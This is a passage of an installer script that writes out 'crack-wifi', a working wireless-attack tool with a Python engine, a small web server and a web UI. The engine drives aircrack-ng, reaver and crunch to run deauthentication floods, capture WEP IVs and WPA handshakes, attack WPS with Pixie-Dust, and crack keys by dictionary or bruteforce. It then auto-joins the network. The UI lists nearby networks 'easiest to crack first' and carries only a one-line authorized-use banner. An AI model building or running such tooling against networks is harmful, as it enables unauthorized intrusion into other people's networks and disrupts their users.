        name = wl.rstrip("/").split("/")[-1] or "wordlist.txt"
        dest = os.path.join(self.workdir, name)
        if os.path.exists(dest) and os.path.getsize(dest) > 0:
            job.emit("download", f"Using cached wordlist {name} (downloaded earlier this session).",
                     "success", pct=100)
            return dest
        job.emit("download", f"Fetching wordlist from the internet: {wl}", pct=0)
        try:
            req = urllib.request.Request(wl, headers={"User-Agent": "crack-wifi/1.0"})
            with urllib.request.urlopen(req, timeout=30) as resp, open(dest, "wb") as out:
                total = int(resp.headers.get("Content-Length") or 0)
                read = 0
                last = -1
                while True:
                    if job.stopped():
                        return None
                    chunk = resp.read(65536)
                    if not chunk:
                        break
                    out.write(chunk)
                    read += len(chunk)
                    if total:
                        pct = int(read * 100 / total)
                        if pct != last and pct % 5 == 0:
                            last = pct
                            job.emit("download", f"Downloading {name}... {pct}%", pct=pct)
        except Exception as e:
            job.emit("download", f"Wordlist download failed: {e}", "error")
            return None
        job.emit("download", f"Saved {name} ({read:,} bytes) — using it for the dictionary attack.",
                 "success", pct=100)
        return dest

    def _succeed(self, job, net, key, method, note, opts, user=None):
        """Record a recovered key and optionally join the network."""
        if key:
            job.emit("done", f"KEY FOUND: {key}", "success")
        connected, cmd = (False, None)
        if opts.get("connect", True):
            connected, cmd = self._connect(job, net.get("ssid"), key)
        job.result = {"key": key, "user": user, "method": method,
                      "connected": connected, "connect_cmd": cmd, "note": note}
        return self._finish(job, "success")

    # -- attack -----------------------------------------------------------
    def _run_attack(self, job):
        net = job.network
        opts = job.options
        enc = (net.get("enc") or "WPA2").upper()
        bssid = net["bssid"]
        ch = net.get("channel", 1)

        job.emit("init", f"Target: {net.get('ssid')} ({bssid}) ch {ch} {enc}.")

        # --- Open network: just join it -------------------------------------
        if enc.startswith("OPEN") or enc == "OPN":
            job.emit("join", "Open network — no key required.")
            connected, cmd = (False, None)
            if opts.get("connect", True):
                connected, cmd = self._connect(job, net.get("ssid"), None)
            job.result = {"key": None, "user": None, "method": "open-join",
                          "connected": connected, "connect_cmd": cmd,
                          "note": "Open network — no passphrase."}
            return self._finish(job, "success")

        mon = self._ensure_monitor(job)
        if job.stopped(): return self._finish(job, "stopped")

        # --- WEP: capture IVs and recover the key ---------------------------
        if enc == "WEP":
            wep_prefix = os.path.join(self.workdir, "wep_" + bssid.replace(":", ""))
            for f in _glob(wep_prefix, "cap"):
                try: os.remove(f)
                except OSError: pass
            job.emit("capture", f"Collecting WEP IVs on channel {ch} (airodump-ng).")
            dump = subprocess.Popen(
                ["airodump-ng", "-c", str(ch), "--bssid", bssid, "-w", wep_prefix,
                 "--output-format", "cap", mon],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # Speed things up with an ARP-replay injection (best effort).
            self._run(["aireplay-ng", "--arpreplay", "-b", bssid, mon], timeout=10)
            key = None
            try:
                deadline = time.time() + opts.get("wep_timeout", 300)
                while time.time() < deadline and not job.stopped():
                    time.sleep(6)
                    caps = _glob(wep_prefix, "cap")
                    if caps:
                        r = self._run(["aircrack-ng", "-b", bssid, caps[0]], timeout=30)
                        key = _parse_aircrack_key(r.stdout)
                        if key:
                            key = key.replace(":", "")
                            break
                        job.emit("crack", "Not enough IVs yet — keep collecting...")
            finally:
                dump.terminate()
                try: dump.wait(timeout=3)
                except subprocess.TimeoutExpired: dump.kill()
            if job.stopped(): return self._finish(job, "stopped")
            if key:
                return self._succeed(job, net, key, "wep-iv",
                                     "Recovered WEP key from captured IVs.", opts)
            job.emit("crack", "Could not gather enough IVs for the WEP key.", "error")
            return self._finish(job, "failed")

        # --- WPS Pixie-Dust -------------------------------------------------
        if net.get("wps") and opts.get("method") in (None, "auto", "wps-pixie") and shutil.which("reaver"):
            job.emit("wps", f"WPS enabled — reaver Pixie-Dust on {bssid}.")
            r = self._run(["reaver", "-i", mon, "-b", bssid, "-c", str(ch),
                           "-K", "1", "-N"], timeout=opts.get("wps_timeout", 180))
            m = re.search(r"WPA PSK:\s*'([^']*)'", r.stdout or "")
            pin = re.search(r"WPS PIN:\s*'?(\d+)", r.stdout or "")
            if m:
                note = f"Recovered via WPS (PIN {pin.group(1) if pin else '?'})."
                return self._succeed(job, net, m.group(1), "wps-pixie", note, opts)
            job.emit("wps", "Pixie-Dust did not recover the key — trying handshake.", "warn")

        if enc.startswith("WPA3"):
            job.emit("crack", "WPA3-SAE — no practical offline attack.", "error")
            return self._finish(job, "failed")

        # --- WPA/WPA2: capture the 4-way handshake (or reuse a cached one) ---
        cap_prefix = os.path.join(self.workdir, "hs_" + bssid.replace(":", ""))
        cached = _glob(cap_prefix, "cap")
        if bssid in self.handshakes and cached and _has_handshake(cached[0], bssid):
            job.emit("capture", "Reusing the handshake captured earlier this session "
                                "— skipping capture.", "success")
            caps = cached
        else:
            for f in cached:
                try: os.remove(f)
                except OSError: pass
            job.emit("capture", f"Capturing handshake on channel {ch} (airodump-ng).")
            dump = subprocess.Popen(
                ["airodump-ng", "-c", str(ch), "--bssid", bssid, "-w", cap_prefix,
                 "--output-format", "cap", mon],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            try:
                deadline = time.time() + opts.get("capture_timeout", 90)
                got = False
                while time.time() < deadline and not job.stopped():
                    job.emit("deauth", f"Sending deauth to {bssid} (aireplay-ng --deauth 5).")
                    self._run(["aireplay-ng", "--deauth", "5", "-a", bssid, mon], timeout=15)
                    time.sleep(4)
                    caps = _glob(cap_prefix, "cap")
                    if caps and _has_handshake(caps[0], bssid):
                        got = True
                        break
            finally:
                dump.terminate()
                try: dump.wait(timeout=3)
                except subprocess.TimeoutExpired: dump.kill()

            if job.stopped(): return self._finish(job, "stopped")
            caps = _glob(cap_prefix, "cap")
            if not caps or not got:
                job.emit("capture", "Could not capture a handshake in time.", "error")
                return self._finish(job, "failed")
            self.handshakes.add(bssid)   # remember it for the rest of the session
            job.emit("capture", "Handshake captured.", "success")

        # --- Crack the handshake --------------------------------------------
        wl = opts.get("wordlist") or self.wordlist
        if opts.get("bruteforce") or opts.get("method") == "handshake+bruteforce":
            charset = {"digits": "0123456789",
                       "lower": "abcdefghijklmnopqrstuvwxyz",
                       "alnum": "abcdefghijklmnopqrstuvwxyz0123456789"}.get(
                           opts.get("charset", "digits"), "0123456789")
            length = int(opts.get("length", 8))
            job.emit("crack", f"Bruteforce via crunch | aircrack-ng ({charset[:6]}..., len {length}).")
            if not shutil.which("crunch"):
                job.emit("crack", "crunch not installed (apt install crunch).", "error")
                return self._finish(job, "failed")
            crunch = subprocess.Popen(["crunch", str(length), str(length), charset],
                                      stdout=subprocess.PIPE)
            r = subprocess.run(["aircrack-ng", "-b", bssid, "-w", "-", caps[0]],
                               stdin=crunch.stdout, capture_output=True, text=True)
            crunch.terminate()
            key = _parse_aircrack_key(r.stdout)
            method = "handshake+bruteforce"
        else:
            wl = self._resolve_wordlist(job, wl)
            if wl is None:
                return self._finish(job, "stopped" if job.stopped() else "failed")
            if not wl or not os.path.exists(wl):
                job.emit("crack", f"Wordlist not found: {wl}", "error")
                return self._finish(job, "failed")
            job.emit("crack", f"Dictionary attack (aircrack-ng -w {os.path.basename(wl)}).", pct=0)
            r = self._run(["aircrack-ng", "-b", bssid, "-w", wl, caps[0]],
                          timeout=opts.get("crack_timeout", 3600))
            key = _parse_aircrack_key(r.stdout)
            method = "handshake+dictionary"

        if key:
            return self._succeed(job, net, key, method,
                                 "Recovered from captured handshake.", opts)
        job.emit("crack", "Key not found with the given wordlist/keyspace.", "error")
        return self._finish(job, "failed")

    def _finish(self, job, status):
        job.status = status
        if status == "stopped":
            job.emit("done", "Attack stopped by user.", "warn")
        return status


# ---------------------------------------------------------------------------
# parsing helpers
# ---------------------------------------------------------------------------
def _glob(prefix, ext):
    import glob
    return sorted(glob.glob(f"{prefix}*-*.{ext}") + glob.glob(f"{prefix}*.{ext}"))


def _parse_airodump_csv(path):
    """Parse airodump-ng CSV into a list of network dicts (AP section + clients)."""
    try:
        with open(path, "r", errors="ignore") as fh:
            content = fh.read()
    except OSError:
        return []

    ap_block, client_block = content, ""
    if "Station MAC" in content:
        ap_block, client_block = content.split("Station MAC", 1)

    # Count clients per BSSID.
    client_counts = {}
    for line in client_block.splitlines():
        parts = [p.strip() for p in line.split(",")]
        if len(parts) > 5 and re.match(r"([0-9A-F]{2}:){5}", parts[5], re.I):
            client_counts[parts[5]] = client_counts.get(parts[5], 0) + 1

    nets = []
    for line in ap_block.splitlines():
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 14:
            continue
        bssid = parts[0]
        if not re.match(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", bssid, re.I):
            continue
        try:
            channel = int(parts[3])
        except ValueError:
            channel = 0
        try:
            signal = int(parts[8])
        except ValueError:
            signal = None
        priv = (parts[5] + " " + parts[6]).upper()
        if "WPA3" in priv:
            enc = "WPA2/WPA3" if "WPA2" in priv else "WPA3"
        elif "WPA2" in priv:
            enc = "WPA2"
        elif "WPA" in priv:
            enc = "WPA"
        elif "WEP" in priv:
            enc = "WEP"
        elif "OPN" in priv or priv.strip() == "":
            enc = "OPEN"
        else:
            enc = "WPA2"
        ssid = parts[13] if len(parts) > 13 else ""
        nets.append({
            "ssid": ssid or "(hidden)",
            "bssid": bssid,
            "enc": enc,
            "channel": channel,
            "signal": signal,
            "clients": client_counts.get(bssid, 0),
            "wps": False,   # airodump CSV doesn't expose WPS; wash could enrich this
        })
    return nets


def _parse_aircrack_key(out):
    if not out:
        return None
    m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", out)
    return m.group(1) if m else None


def _has_handshake(cap_path, bssid):
    """Best-effort handshake check using aircrack-ng's own summary."""
    try:
        r = subprocess.run(["aircrack-ng", cap_path], capture_output=True,
                           text=True, timeout=20)
    except Exception:
        return False
    for line in r.stdout.splitlines():
        if bssid.lower() in line.lower() and ("WPA (1 handshake" in line or "handshake" in line.lower()):
            return "1 handshake" in line or "handshakes" in line
    return "handshake" in (r.stdout or "").lower()


# ---------------------------------------------------------------------------
# factory
# ---------------------------------------------------------------------------
def build_engine(mode, wordlist=None):
    if mode == "real":
        return RealEngine(wordlist=wordlist)
    return DemoEngine(wordlist=wordlist)
CRACK_EOF_ENGINE

  cat > "${BUNDLE}/server/server.py" <<'CRACK_EOF_SERVER'
#!/usr/bin/env python3
"""
server.py — tiny stdlib HTTP server for the crack-wifi web interface.

No third-party dependencies. Serves the static UI from CRACK_WEBROOT and exposes
a small JSON API backed by lib/engine.py.

API:
    GET  /api/status                      -> {mode, wordlist, hostname}
    GET  /api/scan                        -> {networks: [...]}
    POST /api/attack   {bssid, options}   -> {job_id}
    GET  /api/attack?id=..&since=N        -> job snapshot (events since N)
    POST /api/attack/stop  {id}           -> {stopped: bool}

Environment:
    CRACK_MODE      demo|real   (default demo)
    CRACK_WORDLIST  path to default wordlist
    CRACK_WEBROOT   directory holding index.html/style.css/app.js
"""

import os
import sys
import json
import argparse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

# Make lib/ importable regardless of CWD.
HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "lib"))

import engine as engine_mod   # noqa: E402

MODE = os.environ.get("CRACK_MODE", "demo")
WORDLIST = os.environ.get("CRACK_WORDLIST") or None
WEBROOT = os.environ.get("CRACK_WEBROOT") or os.path.join(ROOT, "web")

ENGINE = engine_mod.build_engine(MODE, wordlist=WORDLIST)

_STATIC = {
    "/": ("index.html", "text/html; charset=utf-8"),
    "/index.html": ("index.html", "text/html; charset=utf-8"),
    "/style.css": ("style.css", "text/css; charset=utf-8"),
    "/app.js": ("app.js", "application/javascript; charset=utf-8"),
}


class Handler(BaseHTTPRequestHandler):
    server_version = "crack-wifi/1.0"

    # keep the console clean
    def log_message(self, fmt, *args):
        pass

    # -- helpers ----------------------------------------------------------
    def _send_json(self, obj, code=200):
        body = json.dumps(obj).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _send_static(self, filename, ctype):
        path = os.path.join(WEBROOT, filename)
        try:
            with open(path, "rb") as fh:
                body = fh.read()
        except OSError:
            self.send_error(404, "Not found")
            return
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_json(self):
        length = int(self.headers.get("Content-Length") or 0)
        if length == 0:
            return {}
        try:
            return json.loads(self.rfile.read(length) or b"{}")
        except json.JSONDecodeError:
            return {}

    # -- routing ----------------------------------------------------------
    def do_GET(self):
        parsed = urlparse(self.path)
        route = parsed.path

        if route in _STATIC:
            fname, ctype = _STATIC[route]
            return self._send_static(fname, ctype)

        if route == "/api/status":
            return self._send_json({
                "mode": ENGINE.mode,
                "wordlist": WORDLIST,
                "hostname": self.headers.get("Host", "crack-wifi.local"),
            })

        if route == "/api/scan":
            try:
                nets = ENGINE.scan()
            except Exception as e:  # keep the UI alive on scan failure
                return self._send_json({"error": str(e), "networks": []}, 500)
            return self._send_json({"networks": nets})

        if route == "/api/attack":
            qs = parse_qs(parsed.query)
            job_id = (qs.get("id") or [None])[0]
            since = int((qs.get("since") or ["0"])[0])
            if not job_id:
                return self._send_json({"error": "missing id"}, 400)
            snap = ENGINE.get_job(job_id, since=since)
            if snap is None:
                return self._send_json({"error": "unknown job"}, 404)
            return self._send_json(snap)

        self.send_error(404, "Not found")

    def do_POST(self):
        route = urlparse(self.path).path
        data = self._read_json()

        if route == "/api/attack":
            bssid = data.get("bssid")
            options = data.get("options") or {}
            if not bssid:
                return self._send_json({"error": "missing bssid"}, 400)
            job_id = ENGINE.start_attack(bssid, options)
            return self._send_json({"job_id": job_id})

        if route == "/api/attack/stop":
            job_id = data.get("id")
            stopped = ENGINE.stop_job(job_id) if job_id else False
            return self._send_json({"stopped": stopped})

        self.send_error(404, "Not found")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8777)
    args = ap.parse_args()

    httpd = ThreadingHTTPServer((args.host, args.port), Handler)
    print(f"[server] crack-wifi UI listening on http://{args.host}:{args.port} "
          f"(mode={ENGINE.mode})", flush=True)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        httpd.server_close()


if __name__ == "__main__":
    main()
CRACK_EOF_SERVER

  cat > "${BUNDLE}/web/index.html" <<'CRACK_EOF_INDEX'
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>crack-wifi.local</title>
  <link rel="stylesheet" href="/style.css" />
</head>
<body>
  <header class="topbar">
    <div class="brand">
      <span class="logo">◈</span>
      <span class="title">crack-wifi<span class="dim">.local</span></span>
    </div>
    <div class="topbar-right">
      <span id="mode-badge" class="badge badge-demo">demo</span>
    </div>
  </header>

  <div class="legal-strip">
    Authorized use only — audit networks you own or have written permission to test.
  </div>

  <main class="layout">
    <!-- Left: network list -->
    <section class="panel networks-panel">
      <div class="panel-head">
        <h2>Networks</h2>
        <div class="panel-head-right">
          <span id="net-count" class="muted"></span>
          <button id="rescan-btn" class="icon-btn" title="Rescan" aria-label="Rescan">&#8635;</button>
        </div>
      </div>
      <div id="scan-hint" class="empty-state">
        <p id="scan-hint-title">Scanning for nearby Wi-Fi&hellip;</p>
        <p class="muted">Networks appear here automatically, easiest to crack first.</p>
      </div>
      <ul id="network-list" class="network-list"></ul>
    </section>

    <!-- Right: detail / attack console -->
    <section class="panel detail-panel">
      <div id="detail-empty" class="empty-state">
        <p>Select a network</p>
        <p class="muted">Pick a network on the left to see how hard it is to crack and to start an audit.</p>
      </div>

      <div id="detail" class="detail hidden">
        <div class="detail-head">
          <div>
            <h2 id="d-ssid">SSID</h2>
            <div class="meta-row">
              <span id="d-bssid" class="mono muted"></span>
              <span id="d-enc" class="chip"></span>
              <span id="d-ch" class="chip"></span>
              <span id="d-signal" class="chip"></span>
            </div>
          </div>
          <div class="difficulty">
            <div class="gauge">
              <svg viewBox="0 0 120 120" class="gauge-svg">
                <circle class="gauge-bg" cx="60" cy="60" r="52"></circle>
                <circle id="gauge-arc" class="gauge-arc" cx="60" cy="60" r="52"></circle>
              </svg>
              <div class="gauge-label">
                <span id="d-score" class="gauge-score">0</span>
                <span class="gauge-max">/100</span>
              </div>
            </div>
            <div class="difficulty-text">
              <span id="d-label" class="diff-label">—</span>
              <span id="d-eta" class="muted"></span>
            </div>
          </div>
        </div>

        <ul id="d-reasons" class="reasons"></ul>

        <!-- Advanced options -->
        <details class="advanced">
          <summary>Advanced options</summary>
          <div class="adv-grid">
            <label>
              Method
              <select id="opt-method">
                <option value="auto">Auto (recommended)</option>
                <option value="handshake+dictionary">Handshake + dictionary</option>
                <option value="handshake+bruteforce">Handshake + bruteforce</option>
                <option value="wps-pixie">WPS Pixie-Dust</option>
              </select>
            </label>
            <label>
              Wordlist
              <input id="opt-wordlist" type="text" placeholder="/usr/share/wordlists/rockyou.txt" />
            </label>
            <label>
              Online wordlist
              <select id="opt-online-wordlist">
                <option value="">&mdash; use local path &mdash;</option>
              </select>
            </label>
            <label>
              Bruteforce charset
              <select id="opt-charset">
                <option value="digits">Digits (0-9)</option>
                <option value="lower">Lowercase (a-z)</option>
                <option value="alnum">Alphanumeric</option>
              </select>
            </label>
            <label>
              Bruteforce length
              <input id="opt-length" type="number" min="4" max="16" value="8" />
            </label>
            <label class="checkbox-label">
              <input id="opt-connect" type="checkbox" checked />
              Auto-connect to the network when the key is found
            </label>
          </div>
        </details>

        <div class="actions">
          <button id="attack-btn" class="btn btn-danger">Start audit</button>
          <button id="stop-btn" class="btn btn-ghost hidden">Stop</button>
          <span id="status-pill" class="pill hidden"></span>
        </div>

        <!-- Progress bar -->
        <div id="progress-wrap" class="progress-wrap hidden">
          <div class="progress-top">
            <span id="progress-label" class="progress-label">Working</span>
            <span id="progress-pct" class="progress-pct"></span>
          </div>
          <div class="progress-track">
            <div id="progress-fill" class="progress-fill"></div>
          </div>
        </div>

        <!-- Result -->
        <div id="result" class="result hidden">
          <div class="result-head">Recovered</div>
          <div class="result-grid">
            <div class="result-item">
              <span class="result-key">Network</span>
              <span id="r-ssid" class="result-val mono"></span>
            </div>
            <div class="result-item">
              <span class="result-key">Password</span>
              <span id="r-key" class="result-val mono strong"></span>
            </div>
            <div id="r-user-row" class="result-item hidden">
              <span class="result-key">Login</span>
              <span id="r-user" class="result-val mono"></span>
            </div>
            <div class="result-item">
              <span class="result-key">Method</span>
              <span id="r-method" class="result-val"></span>
            </div>
            <div class="result-item">
              <span class="result-key">Status</span>
              <span id="r-status" class="result-val"></span>
            </div>
          </div>
          <div id="r-connect-cmd" class="result-note mono hidden"></div>
          <div id="r-note" class="result-note muted"></div>
        </div>

        <!-- Live console -->
        <div class="console-wrap">
          <div class="console-head">
            <span>Activity</span>
            <span id="phase-tag" class="phase-tag"></span>
          </div>
          <div id="console" class="console"></div>
        </div>
      </div>
    </section>
  </main>

  <script src="/app.js"></script>
</body>
</html>
CRACK_EOF_INDEX

  cat > "${BUNDLE}/web/style.css" <<'CRACK_EOF_STYLE'
/* crack-wifi.local — simple, clean dark interface */
:root {
  --bg:        #0e1116;
  --bg-2:      #161b22;
  --bg-3:      #1c2430;
  --border:    #2a3441;
  --text:      #e6edf3;
  --muted:     #8b98a5;
  --accent:    #4aa8ff;
  --accent-2:  #2b7fd4;
  --danger:    #ff5c5c;
  --danger-2:  #d63d3d;
  --ok:        #46d17f;
  --warn:      #f0b429;
  --mono: ui-monospace, "SF Mono", "JetBrains Mono", Menlo, Consolas, monospace;
  --sans: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
}

* { box-sizing: border-box; }
html, body { height: 100%; }
body {
  margin: 0;
  background: var(--bg);
  color: var(--text);
  font-family: var(--sans);
  font-size: 14px;
  line-height: 1.5;
}

.hidden { display: none !important; }
.muted { color: var(--muted); }
.dim { color: var(--muted); font-weight: 400; }
.mono { font-family: var(--mono); }
.strong { font-weight: 700; }

/* Top bar */
.topbar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 14px 22px;
  background: var(--bg-2);
  border-bottom: 1px solid var(--border);
}
.brand { display: flex; align-items: center; gap: 10px; }
.logo { color: var(--accent); font-size: 20px; }
.title { font-weight: 600; font-size: 16px; letter-spacing: .2px; }
.topbar-right { display: flex; align-items: center; gap: 12px; }

.panel-head-right { display: flex; align-items: center; gap: 10px; }
.icon-btn {
  background: transparent; color: var(--muted);
  border: 1px solid var(--border); border-radius: 6px;
  width: 28px; height: 28px; padding: 0; line-height: 1;
  font-size: 15px; cursor: pointer;
  display: inline-flex; align-items: center; justify-content: center;
  transition: color .12s, border-color .12s, transform .25s;
}
.icon-btn:hover { color: var(--text); border-color: var(--muted); }
.icon-btn.spinning { animation: spin .8s linear infinite; }
@keyframes spin { to { transform: rotate(360deg); } }

.badge {
  font-family: var(--mono);
  font-size: 11px;
  text-transform: uppercase;
  letter-spacing: .5px;
  padding: 3px 8px;
  border-radius: 4px;
  border: 1px solid var(--border);
}
.badge-demo { color: var(--warn); border-color: #4a3d16; background: #241d0a; }
.badge-real { color: var(--ok);   border-color: #17422a; background: #0c2417; }

.legal-strip {
  background: #241d0a;
  color: var(--warn);
  border-bottom: 1px solid #3a3010;
  padding: 6px 22px;
  font-size: 12px;
  text-align: center;
}

/* Buttons */
.btn {
  font-family: var(--sans);
  font-size: 13px;
  font-weight: 600;
  padding: 8px 16px;
  border-radius: 6px;
  border: 1px solid transparent;
  cursor: pointer;
  transition: background .12s, border-color .12s, opacity .12s;
}
.btn:disabled { opacity: .5; cursor: not-allowed; }
.btn-primary { background: var(--accent-2); color: #fff; }
.btn-primary:hover:not(:disabled) { background: var(--accent); }
.btn-danger { background: var(--danger-2); color: #fff; }
.btn-danger:hover:not(:disabled) { background: var(--danger); }
.btn-ghost { background: transparent; color: var(--muted); border-color: var(--border); }
.btn-ghost:hover { color: var(--text); border-color: var(--muted); }

/* Layout */
.layout {
  display: grid;
  grid-template-columns: 340px 1fr;
  gap: 24px;
  padding: 26px 28px 48px;
  max-width: 1180px;
  margin: 0 auto;
  align-items: start;
}
@media (max-width: 820px) {
  .layout { grid-template-columns: 1fr; padding: 18px 16px 32px; gap: 18px; }
}
@media (min-width: 821px) {
  .networks-panel {
    position: sticky; top: 24px;
    max-height: calc(100vh - 48px);
    display: flex; flex-direction: column;
  }
  .networks-panel .network-list { overflow-y: auto; }
}

.panel {
  background: var(--bg-2);
  border: 1px solid var(--border);
  border-radius: 10px;
  overflow: hidden;
}
.panel-head {
  display: flex; align-items: baseline; justify-content: space-between;
  padding: 14px 16px;
  border-bottom: 1px solid var(--border);
}
.panel-head h2 { margin: 0; font-size: 14px; text-transform: uppercase; letter-spacing: .6px; color: var(--muted); }

.empty-state { padding: 40px 20px; text-align: center; }
.empty-state p { margin: 4px 0; }

/* Network list */
.network-list { list-style: none; margin: 0; padding: 6px; }
.network-item {
  display: flex; align-items: center; gap: 10px;
  padding: 11px 12px;
  border-radius: 8px;
  cursor: pointer;
  border: 1px solid transparent;
}
.network-item:hover { background: var(--bg-3); }
.network-item.active { background: var(--bg-3); border-color: var(--accent-2); }

.ni-signal { width: 26px; text-align: center; font-family: var(--mono); font-size: 11px; color: var(--muted); }
.ni-main { flex: 1; min-width: 0; }
.ni-ssid { font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
.ni-sub { font-size: 11px; color: var(--muted); font-family: var(--mono); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
.ni-diff {
  font-size: 11px; font-weight: 600;
  padding: 2px 7px; border-radius: 999px;
  white-space: nowrap;
}
.diff-Trivial   { background:#0c2417; color:var(--ok); }
.diff-Easy      { background:#0c2417; color:var(--ok); }
.diff-Moderate  { background:#241d0a; color:var(--warn); }
.diff-Hard      { background:#2a1414; color:#ff8f6b; }
.diff-Very.hard, .diff-Veryhard { background:#2a1414; color:var(--danger); }

.lock { font-size: 12px; }
.ni-hs {
  font-size: 10px; font-weight: 700; letter-spacing: .3px;
  padding: 2px 6px; border-radius: 999px;
  background: #0c2417; color: var(--ok); border: 1px solid #17422a;
  white-space: nowrap;
}

/* Loading skeleton shown while auto-scanning */
.skeleton-item {
  height: 46px; margin: 6px; border-radius: 8px;
  background: linear-gradient(90deg, var(--bg-3) 25%, #222c39 37%, var(--bg-3) 63%);
  background-size: 400% 100%;
  animation: shimmer 1.2s ease-in-out infinite;
}
@keyframes shimmer { 0% { background-position: 100% 0; } 100% { background-position: 0 0; } }

/* Detail panel */
.detail { padding: 18px; }
.detail-head { display: flex; justify-content: space-between; gap: 20px; align-items: flex-start; }
.detail-head h2 { margin: 0 0 6px; font-size: 20px; }
.meta-row { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; }
.chip {
  font-size: 11px; font-family: var(--mono);
  padding: 2px 8px; border-radius: 4px;
  background: var(--bg-3); border: 1px solid var(--border); color: var(--muted);
}

/* Difficulty gauge */
.difficulty { display: flex; align-items: center; gap: 12px; }
.gauge { position: relative; width: 84px; height: 84px; }
.gauge-svg { transform: rotate(-90deg); width: 84px; height: 84px; }
.gauge-bg { fill: none; stroke: var(--bg-3); stroke-width: 10; }
.gauge-arc {
  fill: none; stroke: var(--accent); stroke-width: 10; stroke-linecap: round;
  stroke-dasharray: 327; stroke-dashoffset: 327;
  transition: stroke-dashoffset .6s ease, stroke .3s;
}
.gauge-label {
  position: absolute; inset: 0; display: flex; flex-direction: column;
  align-items: center; justify-content: center;
}
.gauge-score { font-size: 22px; font-weight: 700; font-family: var(--mono); }
.gauge-max { font-size: 10px; color: var(--muted); }
.difficulty-text { display: flex; flex-direction: column; }
.diff-label { font-weight: 700; font-size: 15px; }

.reasons { list-style: none; margin: 16px 0 0; padding: 0; display: grid; gap: 6px; }
.reasons li {
  font-size: 12.5px; color: var(--muted);
  padding-left: 18px; position: relative;
}
.reasons li::before { content: "›"; position: absolute; left: 4px; color: var(--accent); }

/* Advanced */
.advanced { margin-top: 18px; border-top: 1px solid var(--border); padding-top: 12px; }
.advanced summary { cursor: pointer; font-weight: 600; color: var(--muted); font-size: 13px; }
.advanced summary:hover { color: var(--text); }
.adv-grid {
  display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 12px;
}
.adv-grid label { display: flex; flex-direction: column; gap: 4px; font-size: 12px; color: var(--muted); }
.adv-grid input, .adv-grid select {
  background: var(--bg); border: 1px solid var(--border); color: var(--text);
  padding: 7px 9px; border-radius: 6px; font-family: var(--mono); font-size: 12px;
}
.adv-grid input:focus, .adv-grid select:focus { outline: none; border-color: var(--accent-2); }
.adv-grid .checkbox-label {
  grid-column: 1 / -1;
  flex-direction: row; align-items: center; gap: 8px;
  font-size: 12.5px; color: var(--text); cursor: pointer;
}
.adv-grid .checkbox-label input { width: 15px; height: 15px; accent-color: var(--accent); }

/* Actions */
.actions { display: flex; align-items: center; gap: 12px; margin-top: 18px; }
.pill {
  font-size: 12px; font-family: var(--mono);
  padding: 4px 10px; border-radius: 999px;
  border: 1px solid var(--border);
}
.pill-running { color: var(--accent); border-color: var(--accent-2); }
.pill-success { color: var(--ok); border-color: #17422a; }
.pill-failed  { color: var(--danger); border-color: #4a1717; }
.pill-stopped { color: var(--warn); border-color: #4a3d16; }

/* Progress bar (native-feeling) */
.progress-wrap { margin-top: 16px; }
.progress-top {
  display: flex; justify-content: space-between; align-items: baseline;
  margin-bottom: 6px;
}
.progress-label { font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: .5px; }
.progress-pct { font-family: var(--mono); font-size: 12px; color: var(--accent); font-weight: 700; }
.progress-track {
  height: 10px; border-radius: 999px;
  background: var(--bg-3); border: 1px solid var(--border);
  overflow: hidden;
}
.progress-fill {
  height: 100%; width: 0%;
  background: linear-gradient(90deg, var(--accent-2), var(--accent));
  border-radius: 999px;
  transition: width .35s ease;
}
.progress-fill.download { background: linear-gradient(90deg, #7a5cff, #b08bff); }
.progress-fill.indeterminate {
  width: 40% !important;
  background: linear-gradient(90deg, transparent, var(--accent), transparent);
  animation: indet 1.1s ease-in-out infinite;
}
@keyframes indet { 0% { margin-left: -40%; } 100% { margin-left: 100%; } }

/* Result */
.result {
  margin-top: 18px; padding: 16px;
  border: 1px solid #17422a; background: #0c1a12; border-radius: 10px;
}
.result-head { font-weight: 700; color: var(--ok); margin-bottom: 12px; letter-spacing: .3px; }
.result-grid { display: grid; gap: 10px; }
.result-item { display: flex; justify-content: space-between; align-items: baseline; gap: 12px; }
.result-key { color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: .5px; }
.result-val { text-align: right; word-break: break-all; }
.result-val.strong { font-size: 17px; color: var(--ok); }
.result-val.ok { color: var(--ok); font-weight: 600; }
.result-val.warn { color: var(--warn); font-weight: 600; }
.result-note { margin-top: 12px; font-size: 12px; }
.result-note.mono { font-family: var(--mono); color: var(--accent); background: var(--bg-3);
  padding: 8px 10px; border-radius: 6px; word-break: break-all; }

/* Console */
.console-wrap { margin-top: 20px; }
.console-head {
  display: flex; justify-content: space-between; align-items: center;
  padding: 8px 12px; background: var(--bg-3);
  border: 1px solid var(--border); border-bottom: none;
  border-radius: 8px 8px 0 0;
  font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: .5px;
}
.phase-tag { font-family: var(--mono); color: var(--accent); text-transform: none; letter-spacing: 0; }
.console {
  height: 260px; overflow-y: auto;
  background: #0a0d12; border: 1px solid var(--border); border-radius: 0 0 8px 8px;
  padding: 10px 12px;
